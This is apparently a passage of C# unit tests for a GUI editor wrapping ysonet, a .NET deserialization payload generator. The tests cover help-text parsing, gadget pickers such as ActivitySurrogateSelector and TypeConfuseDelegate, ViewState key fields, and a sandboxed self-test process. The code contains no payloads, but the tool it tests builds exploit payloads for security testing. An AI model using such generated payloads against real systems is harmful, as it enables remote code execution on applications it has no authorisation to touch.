                psi.EnvironmentVariables[IsolatedSelfTest.FormatterVar] = "Json.NET";

                var childError = new StringBuilder();
                int exitCode;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    // Drained asynchronously and waited on the PROCESS, never on the streams -
                    // the same rule the product path follows, because a child that dies leaves
                    // its pipe handles held open by Windows error reporting.
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate (object s, System.Diagnostics.DataReceivedEventArgs e)
                    {
                        if (e.Data != null) childError.AppendLine(e.Data);
                    };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    AssertTrue(proc.WaitForExit(30000),
                        "the isolated self-test child finishes rather than hanging");
                    exitCode = proc.ExitCode;
                }

                AssertEqual(0, exitCode, "a readable, harmless payload exits the child cleanly, "
                    + "which proves the child read a hand written format AND survived the forced "
                    + "collection. stderr was: " + childError.ToString().Trim());

                // The other half: a format the child has no reader for must fail loudly, with
                // the shared wording, instead of reporting a self-test that did nothing.
                psi.EnvironmentVariables[IsolatedSelfTest.FormatterVar] = "NoSuchFormatter";
                var refusedError = new StringBuilder();
                int refusedExit;
                using (var proc = System.Diagnostics.Process.Start(psi))
                {
                    proc.OutputDataReceived += delegate { };
                    proc.ErrorDataReceived += delegate (object s, System.Diagnostics.DataReceivedEventArgs e)
                    {
                        if (e.Data != null) refusedError.AppendLine(e.Data);
                    };
                    proc.BeginOutputReadLine();
                    proc.BeginErrorReadLine();
                    AssertTrue(proc.WaitForExit(30000), "the refusing child finishes too");
                    refusedExit = proc.ExitCode;
                }
                AssertEqual(1, refusedExit, "an unreadable format is a reported failure, not a pass");
                AssertTrue(refusedError.ToString().Contains("no reader for that format"),
                    "and the child says why: " + refusedError.ToString().Trim());
            }
            finally
            {
                SafeDelete(payloadFile);
            }
        }

        private static void OptionHeuristics()
        {
            // Choices pulled from an enumerating description.
            var alg = EditableField.ParseChoices("The encryption algorithm can be set to DES, 3DES, or AES. Default: AES.");
            AssertTrue(alg != null && alg.Count == 3, "three algorithms parsed");
            AssertEqual("DES", alg[0], "first choice");
            AssertEqual("AES", alg[2], "last choice");

            // Single-quoted tokens (delivery modes) become choices.
            var modes = EditableField.ParseChoices("'winforms' (default) or 'wpfxaml': two delivery modes");
            AssertTrue(modes != null && modes.Contains("winforms") && modes.Contains("wpfxaml"), "quoted modes parsed");

            // A default token is recovered.
            AssertEqual("AES", EditableField.ParseDefault("... can be DES, 3DES, or AES. Default: AES."), "default AES");
            AssertEqual("winforms", EditableField.ParseDefault("delivery mode. Default: winforms"), "default winforms");
            AssertEqual("", EditableField.ParseDefault("no default mentioned here"), "no default -> empty");

            // A VALUE THAT CONTAINS COMMAS IS NOT A LIST OF CHOICES. An assembly display
            // name is the case that exposed this: the editor offered "Version=3.0.0.0" and
            // "Culture=neutral" as selectable values for WSManPluginInstance's --assembly,
            // and picking one produced a payload naming an assembly that does not exist.
            // The tell is two or more spaceless Name=Value parts.
            var asmHelp = "The assembly display name written into the payload. Default: "
                + "System.Management.Automation, Version=3.0.0.0, Culture=neutral, "
                + "PublicKeyToken=31bf3856ad364e35 which is Windows PowerShell's GAC identity.";
            AssertTrue(EditableField.ParseChoices(asmHelp) == null,
                "an assembly display name is one value, not a choice list");

            // The same rule must not silence a NUMBERED list, which is written with spaces
            // around '=' and is a real set of alternatives.
            var numbered = EditableField.ParseChoices(
                "Which carrier to use: 1 = bare ObjectDataProvider, 2 = wrapped, 3 = nested.");
            AssertTrue(numbered != null && numbered.Count >= 3,
                "a numbered choice list still parses");

            // A QUOTED default is read WHOLE, separators included. Unquoted, a default can
            // only ever be one bare token, which cuts an assembly display name at its first
            // comma and leaves a value naming nothing.
            AssertEqual("System.Management.Automation, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
                EditableField.ParseDefault("The assembly name.\r\nDefault: \"System.Management.Automation, "
                    + "Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35\"\r\nwhich is the GAC one."),
                "a quoted default keeps its commas and spaces");
            AssertEqual("AES", EditableField.ParseDefault("... can be DES or AES. Default: AES."),
                "an unquoted default still stops at the first token break");

            // And the real gadget, through the editor, so the product surface is checked and
            // not just the parser.
            var wsmanEditor = new ModuleEditor(null, null, true, null, new WizardSession());
            var wsmanFields = wsmanEditor.BuildFieldsForTest("WSManPluginInstance");
            EditableField asmField = FindEditable(wsmanFields, WSManPluginInstanceGenerator.AssemblyOptionName);
            AssertTrue(asmField != null, "the editor offers the assembly setting");
            AssertTrue(asmField.Choices == null || asmField.Choices.Count == 0,
                "and offers it as free text, because any fragment of an assembly display name "
                    + "is a broken value: " + (asmField.Choices == null ? "" : string.Join(" | ", asmField.Choices.ToArray())));

            // It opens holding the real default instead of empty, so the long identity can be
            // edited rather than retyped, and Del restores it.
            AssertEqual(WSManPluginInstanceGenerator.DefaultAssemblyName, asmField.Value,
                "the assembly field starts at the full default identity");
            AssertEqual(WSManPluginInstanceGenerator.DefaultAssemblyName, asmField.DefaultValue,
                "and that is captured as its default, so Del restores it");

            // The shown command then carries it explicitly, which is this tool's existing
            // convention rather than anything new: OptionField.ToArgv emits any value-taking
            // option whose Value is non-empty, and every option with a parsed default already
            // behaves this way (AltserializationPlugin's "mode" is the older example). It
            // makes "Show ysonet command" reproduce exactly what the editor would build, so
            // it is asserted as intended behaviour rather than tolerated.
            string wsmanCmd = wsmanEditor.GadgetCommandLineForTest();
            AssertTrue(wsmanCmd.IndexOf("--" + WSManPluginInstanceGenerator.AssemblyOptionName,
                    StringComparison.Ordinal) >= 0,
                "the shown command states the identity it will use: " + wsmanCmd);
            AssertTrue(wsmanCmd.IndexOf(WSManPluginInstanceGenerator.DefaultAssemblyName,
                    StringComparison.Ordinal) >= 0,
                "and it is the WHOLE identity, not a fragment cut at the first comma: " + wsmanCmd);

            // Required inference: value option with no default/ignored/optional.
            AssertTrue(EditableField.LooksRequired("The validationKey from machineKey.", true), "no-default value option looks required");
            AssertTrue(!EditableField.LooksRequired("Gadget chain. Default: ActivitySurrogateSelector.", true), "with-default is not required");
            AssertTrue(!EditableField.LooksRequired("A flag.", false), "flags are never required");
            AssertTrue(!EditableField.LooksRequired("Validate and decrypt the viewstate if it has been encrypted.", true), "conditional (if) is not required");
        }

        private static void EditorPluginFields()
        {
            // The editor turns a plugin's OptionSet into editable fields, recovering
            // defaults and choices, and offers a gadget picker for the gadget option.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("ViewState");

            EditableField gadget = FindEditable(fields, "gadget");
            AssertTrue(gadget != null && gadget.Kind == FieldKind.Pick, "gadget option is a picker");
            AssertTrue(gadget.Choices != null && gadget.Choices.Contains("TypeConfuseDelegate"), "gadget picker lists gadgets");
            AssertEqual("ActivitySurrogateSelector", gadget.Value, "gadget defaults to ActivitySurrogateSelector");

            EditableField valg = FindEditable(fields, "validationalg");
            AssertTrue(valg != null && valg.Kind == FieldKind.Choice, "validationalg is a choice");
            AssertTrue(valg.Choices.Contains("HMACSHA256"), "validationalg choices parsed from help");
            AssertTrue(valg.AllowCustom, "a choice still allows a custom value");

            EditableField vkey = FindEditable(fields, "validationkey");
            AssertTrue(vkey != null && vkey.Required, "validationkey is flagged required");

            // Output controls and a Generate action are always present.
            AssertTrue(FindEditable(fields, "output") != null, "output format field present");
            bool hasGenerate = false;
            foreach (EditableField f in fields)
                if (f.IsAction) hasGenerate = true;
            AssertTrue(hasGenerate, "a Generate action row is present");
        }

        private static EditableField FindEditable(List<EditableField> fields, string label)
        {
            foreach (EditableField f in fields)
                if (string.Equals(f.Label, label, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static EditableField FindAction(List<EditableField> fields, string actionId)
        {
            foreach (EditableField f in fields)
                if (f.IsAction && string.Equals(f.ActionId, actionId, StringComparison.OrdinalIgnoreCase))
                    return f;
            return null;
        }

        private static void EditorActionsAndOwnership()
        {
            var editor = new ModuleEditor(null, null, true, null, null);
            var fields = editor.BuildFieldsForTest("ObjectDataProvider");

            // Generate, copy-to-clipboard, and show-command actions are all offered.
            AssertTrue(FindAction(fields, "generate") != null, "generate action present");
            AssertTrue(FindAction(fields, "clipboard") != null, "copy-to-clipboard action present");
            AssertTrue(FindAction(fields, "showcmd") != null, "show-command action present");

            // Built-ins are not module-own; the gadget's own options (e.g. variant) are.
            AssertTrue(!FindEditable(fields, "formatter").ModuleOwn, "formatter is a shared built-in");
            AssertTrue(!FindEditable(fields, "output").ModuleOwn, "output is a shared built-in");
            EditableField variant = FindEditable(fields, "variant");
            AssertTrue(variant != null && variant.ModuleOwn, "variant is a gadget-specific option");
        }

        private static void ChoiceDetection()
        {
            // Colon-introduced list, keeping a dotted token intact (System.String).
            var fmt = EditableField.ParseChoices("The object format: Csv, PenData, System.String, WaveAudio. Default: PenData");
            AssertTrue(fmt != null && fmt.Count == 4, "colon list of four tokens");
            AssertTrue(fmt.Contains("System.String"), "dotted token kept whole");

            // Numbered options -> the numbers.
            var num = EditableField.ParseChoices("XAML variant: 1 = bare, 2 = wrapper. Default: 2");
            AssertTrue(num != null && num.Count == 2 && num[0] == "1" && num[1] == "2", "numbered choices 1,2");

            // Quoted lowercase modes, ignoring a quoted CamelCase format name.
            var mode = EditableField.ParseChoices("mode. 'winforms' (default) under the 'Xaml' format, or 'wpfxaml'. Default: winforms");
            AssertTrue(mode != null && mode.Count == 2, "two lowercase modes");
            AssertTrue(mode.Contains("winforms") && mode.Contains("wpfxaml") && !mode.Contains("Xaml"), "CamelCase 'Xaml' excluded");

            // And the real Clipboard plugin options come through as selects. Clipboard
            // declares modes, so 'mode' is the mode picker (two delivery modes) and the
            // inner xamlvariant is a choice shown in the wpfxaml mode.
            var editor = new ModuleEditor(null, null, false, null, null);
            var fields = editor.BuildFieldsForTest("Clipboard");
            EditableField modeField = FindEditable(fields, "mode");
            AssertTrue(modeField != null && modeField.Kind == FieldKind.Choice, "Clipboard mode is a choice");
            AssertTrue(modeField.Choices.Count == 2, "two delivery modes offered");
            EditableField xv = FindEditable(fields, "xamlvariant");
            AssertTrue(xv != null && xv.Kind == FieldKind.Choice, "xamlvariant is a choice");
        }

